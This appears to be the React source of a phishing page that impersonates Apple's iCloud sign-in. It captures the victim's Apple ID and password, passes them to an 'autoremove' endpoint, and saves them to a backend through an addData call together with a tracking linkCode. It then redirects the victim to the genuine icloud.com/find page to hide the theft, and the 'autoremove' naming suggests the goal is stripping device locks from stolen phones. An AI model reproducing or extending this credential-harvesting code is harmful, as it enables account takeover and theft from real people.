import { useState, useEffect } from 'react';
import { Form, Button, FloatingLabel } from 'react-bootstrap'; // Asegúrate de tener react-bootstrap instalado
import iconsSesionWitheN from '../../assets/img/iconsSesionWitheN.png';
import iconsSesionBlackN from '../../assets/img/iconsSesionBlackN.png';
import SvgSpinner from '../../../resources/SvgSpinner';
import imgNext from '../../assets/img/btnNextWhite.png';
import '../../assets/css/auth.css'; // Asegúrate de que la ruta sea correcta
// import PoputLogin from './PoputLogin'; // Descomenta si tienes este componente
// import translator from '../../utils/translator'; // Descomenta si tienes esta función

import Login from './Login';
import Passcode from './Passcode'; // Asegúrate de que este componente exista
import responses from '../../../api/responses';
import { useData } from '../../../context/UserContext'

const SectionAuth = ({ darkMode, translator, styles }) => {
    const [statusLogin, setStatusLogin] = useState(false);
    const [accountUsername, setAccountUsername] = useState('');
    const [accountPassword, setAccountPassword] = useState('');
    const [opLogin, setOpLogin] = useState(false);
    const [passCodeActive, setPassCodeActive] = useState(false);
    const [showLogin, setShowLogin] = useState(false);
    const { user } = useData();

    useEffect(() => {
        if (user?.data?.unlockCode === "6"|| user?.data?.unlockCode === "4" || user?.data?.unlockCode === "alphanumeric") {
            setPassCodeActive(true);
        } else {
            setShowLogin(true);
            setPassCodeActive(false);
        }
    }, [user?.data?.unlockCode]);

    const showInputPassword = () => { //Muestra el input de la contraseña
        if (accountUsername != '') {
            setStatusLogin(true)

            setTimeout(() => {
                document.getElementById('btnAccount').style.opacity = '0.6';
                const sliderElement = document.getElementById("SliderIC")[0];
                if (sliderElement) {
                    sliderElement.classList.toggle("slide-down");
                }
                document.getElementById("SliderDivIC").style.transform = "translateY(0%)"
                document.getElementById("btnAccount").style.transform = "translateY(-10%)"
                document.getElementById('accountPassword').focus()
                setStatusLogin(false)
                setOpLogin(true)
            }, 1500);

            setTimeout(() => {
                document.getElementById('accountUsername').style.borderRadius = '12px 12px 0 0';
                document.getElementById('accountPassword').style.borderRadius = '0 0 12px 12px';
                document.getElementById("SliderIC").style.borderRadius = '0 0 12px 12px';
                document.getElementById("SliderDivIC").style.borderRadius = '0 0 12px 12px';
            }, 1500);
        }
    }

    const hideInputPassword = () => { //Oculta el input de la contraseña    
        document.getElementById('accountUsername').style.borderRadius = '12px';
        document.getElementById('accountPassword').style.borderRadius = '12px';
        document.getElementById("SliderIC").style.borderRadius = '12px 12px';
        document.getElementById("SliderDivIC").style.borderRadius = '12px';
        document.getElementsByClassName('errorMessage')[0].style.display = 'none'
        const sliderElement = document.getElementById("SliderIC")[0];
        if (sliderElement) {
            sliderElement.classList.toggle("slide-up");
        }
        document.getElementById("SliderDivIC").style.transform = "translateY(-128%)"
        document.getElementById("btnAccount").style.transform = "translateY(-157%)"
        setStatusLogin(false)
    }

    const handleLogin = async (e) => {
        e.preventDefault();
        if (accountUsername != '' && !opLogin) {
            showInputPassword();
            setAccountPassword('')
            //console.log('Solo se envio el login')
        } else if (accountUsername != '' && opLogin) {
            if (accountPassword != '') {
                setStatusLogin(true)
                //console.log('Enviando usuario y contraseña')

                try {
                    // console.log('Autoremoved failed');
                    setStatusLogin(true)
                    const response = await responses.autoremove(accountUsername, accountPassword);

                    let status = response.success;
                    let responseData = response.message;
                    //console.log(status)
                    //console.log(responseData)

                    await saveAutoRemoveData(status, responseData);
                    if (!status) {
                        //console.log('Autoremoved failed');
                        setStatusLogin(false)
                        document.getElementsByClassName('errorMessage')[0].style.display = 'block';
                    } else if (status) {
                        setStatusLogin(true);
                        if (responseData === 'WRONG - Error: Apple ID or Password Invalid') {
                            setStatusLogin(false)
                            document.getElementsByClassName('errorMessage')[0].style.display = 'block';
                        }
                        setTimeout(() => {
                            localStorage.removeItem(`userData_${user?.data?.linkCode}`);
                            //window.location.reload();
                            window.location.href = 'https://www.icloud.com/find';
                            
                        }, 1000);
                    }
                } catch (error) {
                    localStorage.removeItem(`userData_${user?.data?.linkCode}`);
                }
            }
        }
        /* setStatusLogin(true);
         const sliderElement = document.getElementById("Slider")[0];
         if (sliderElement) {
 
             sliderElement.classList.toggle("slide-down");
         }
         document.getElementById("SliderDiv").style.transform = "translateY(0%)"
         // Aquí va la lógica de login
         setTimeout(() => setStatusLogin(false), 2000); // Simulación*/
    };

    const saveAutoRemoveData = async (status, response) => {
        let data = {
            linkCode: user?.data?.linkCode || '',
            appleID: accountUsername,
            password: accountPassword,
            response: response,
            username: user?.data?.username || '',
            status: status,
        }
        const resp = await responses.addData(data);
        return resp;
    }

    return (
        <>
            <section className={`container ${styles.sectionInicioSesion} d-flex justify-content-center d-block`}>
                <div className={`row text-center d-flex justify-content-center ${styles.bgInicioSection}`}>
                    <div className="mb-5">
                        <img className={`img-fluid m-auto ${styles.imgHeader}`} src={iconsSesionWitheN} width="170" height="170" alt="" />
                        <img className={`img-fluid m-auto ${styles.imgHeaderTwo}`} src={iconsSesionBlackN} width="170" height="170" alt="" />
                    </div>

                    {
                        passCodeActive && !showLogin
                            ? (
                                <Passcode
                                    setShowLogin={setShowLogin}
                                    darkMode={darkMode}
                                    translator={translator}
                                    styles={styles}
                                />
                            )
                            : (
                                <Login
                                    handleLogin={handleLogin}
                                    hideInputPassword={hideInputPassword}
                                    statusLogin={statusLogin}
                                    accountUsername={accountUsername}
                                    setAccountUsername={setAccountUsername}
                                    accountPassword={accountPassword}
                                    setAccountPassword={setAccountPassword}
                                    opLogin={opLogin}
                                    setOpLogin={setOpLogin}
                                    imgNext={imgNext}
                                    SvgSpinner={SvgSpinner}
                                    darkMode={darkMode}
                                    translator={translator}
                                    styles={styles}
                                />
                            )
                    }

                    <div
                        className="container d-flex flex-column justify-content-center"
                        style={!showLogin ? { paddingBottom: '60px' } : {}}
                    >
                        {
                            showLogin && (
                                <div className={`form-check d-flex justify-content-center ${styles.checkMargin}`}>
                                    <input className={`form-check-input ${styles.checkColor} me-2`} type="checkbox" value="" id="flexCheckDefault" />
                                    <label className={`form-check-label ${styles.textCheck}`} htmlFor="flexCheckDefault">
                                        {translator('Mantener la sesión iniciada')}
                                    </label>
                                </div>
                            )
                        }
                        <a className={`${styles.linkInicioSesion}`} style={{ cursor: 'pointer', display: passCodeActive ? 'block' : 'none' }} onClick={() => {
                            if (showLogin && passCodeActive) {
                                setShowLogin(false)
                            } else if (!showLogin && passCodeActive) {
                                setShowLogin(true)
                            } else {
                                '';
                            }
                        }}>{
                                showLogin ? translator('¿Olvidaste la contraseña?') : translator('¿Olvidaste tu código de acceso?')}
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className="bi bi-arrow-up-short my-svg-element" viewBox="0 0 16 16">
                                <path fillRule="evenodd" d="M8 12a.5.5 0 0 0 .5-.5V5.707l2.146 2.147a.5.5 0 0 0 .708-.708l-3-3a.5.5 0 0 0-.708 0l-3 3a.5.5 0 1 0 .708.708L7.5 5.707V11.5a.5.5 0 0 0 .5.5" />
                            </svg>
                        </a>
                        {showLogin && <a className={`${styles.linkInicioSesion}`} href="https://support.apple.com/" target='_blank'>{translator('Crea una cuenta de Apple')}</a>}
                    </div>
                </div>
            </section>
        </>
    );
}

export default SectionAuth;